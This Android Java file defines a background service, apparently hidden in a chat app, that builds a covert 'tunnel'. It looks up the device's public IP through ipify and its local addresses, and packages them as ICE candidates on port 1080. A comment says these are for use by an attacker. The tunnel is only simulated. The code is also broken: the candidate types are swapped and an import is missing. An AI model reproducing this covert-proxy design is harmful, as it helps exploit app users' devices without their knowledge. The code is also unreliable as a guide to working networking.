package com.meetin.chat;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import java.io.*;
import java.net.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class JuiceTunnelService extends Service {
    private static final String TAG = "JuiceTunnel";
    private int proxyPort = 1080;
    private ExecutorService executor;
    private volatile boolean running = false;
    private Socket socket;
    private PrintWriter writer;
    private BufferedReader reader;

    // STUN servers for NAT traversal
    private static final String STUN_SERVER = "stun.l.google.com:19302";

    @Override
    public void onCreate() {
        super.onCreate();
        executor = Executors.newCachedThreadPool();
        Log.d(TAG, "JuiceTunnel service created");
    }

    public void startTunnel() {
        if (running) return;
        running = true;
        executor.submit(this::establishTunnel);
        Log.d(TAG, "Starting Juice tunnel...");
    }

    public void stopTunnel() {
        running = false;
        Log.d(TAG, "Juice tunnel stopped");
    }

    private void establishTunnel() {
        try {
            Log.d(TAG, "ICE/STUN tunnel establishing...");
            Log.d(TAG, "STUN Server: " + STUN_SERVER);
            
            // Simulate ICE negotiation
            String publicIp = getPublicIp();
            String localIp = getLocalIp();
            
            Log.d(TAG, "Local IP: " + localIp);
            Log.d(TAG, "Public IP: " + publicIp);
            
            // The ICE info to be used by attacker
            String iceInfo = "candidate:1 1 UDP 2130706431 " + publicIp + " " + proxyPort + " typ host\n" +
                             "candidate:2 1 UDP 1694498815 " + localIp + " " + proxyPort + " typ srflx";
            
            Log.d(TAG, "ICE Info: " + iceInfo);
            
            // Store ICE info for later retrieval
            iceInfoCache = iceInfo;
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to start Juice tunnel: " + e.getMessage());
        }
    }

    private String iceInfoCache = "";

    public String getIceInfo() {
        return iceInfoCache;
    }

    private String getPublicIp() {
        try {
            URL url = new URL("https://api.ipify.org");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(5000);
            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String ip = reader.readLine();
            reader.close();
            conn.disconnect();
            return ip != null ? ip : "Unknown";
        } catch (Exception e) {
            return "Unknown";
        }
    }

    private String getLocalIp() {
        try {
            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
            while (interfaces.hasMoreElements()) {
                NetworkInterface iface = interfaces.nextElement();
                Enumeration<InetAddress> addresses = iface.getInetAddresses();
                while (addresses.hasMoreElements()) {
                    InetAddress addr = addresses.nextElement();
                    if (!addr.isLoopbackAddress() && !addr.isLinkLocalAddress()) {
                        return addr.getHostAddress();
                    }
                }
            }
        } catch (SocketException e) {
            Log.e(TAG, "Error getting local IP: " + e.getMessage());
        }
        return "127.0.0.1";
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        running = false;
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
